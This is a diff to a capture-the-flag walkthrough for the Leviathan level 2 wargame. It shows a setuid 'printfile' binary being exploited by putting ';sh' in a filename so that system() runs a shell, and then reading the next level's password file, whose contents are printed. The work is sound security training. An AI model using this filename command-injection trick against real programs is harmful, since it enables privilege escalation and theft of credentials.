@@ -72,10 +72,28 @@ system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <... system resumed> )                                       = 0
 +++ exited (status 0) +++
 ```
-so what happen is access do permission check if we have access to read the file or not
-and what cat do is do it don't need the full path for the file 
-so if we created a symbolic link between tmp.txt and /etc/leviathan_pass/leviathan3 
-we can get both rules correct at same time
+after quite some time and searching found out 
+With a Simple trick we can execute chain command with in filename because it doesn't check the input
+so what happen is the following it will check for **/tmp/menz/test** try to print it out but its not found and execute the shell
+
+```shell
+leviathan2@leviathan:~$ ltrace ./printfile "/tmp/menz/test;sh"
+__libc_start_main(0x804852d, 2, 0xffffd7d4, 0x8048600 <unfinished ...>
+access("/tmp/menz/test;sh", 4)            = 0
+snprintf("/bin/cat /tmp/menz/test;sh", 511, "/bin/cat %s", "/tmp/menz/test;sh") = 26
+system("/bin/cat /tmp/menz/test;sh"/bin/cat: /tmp/menz/test: No such file or directory
+$
+```
+Now lets get our flag
+```shell
+leviathan2@leviathan:~$ touch "/tmp/menz/test;sh"
+leviathan2@leviathan:~$ ./printfile "/tmp/menz/test;sh"
+/bin/cat: /tmp/menz/test: No such file or directory
+$ whoami
+leviathan3
+$ cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
+```
 
 
 
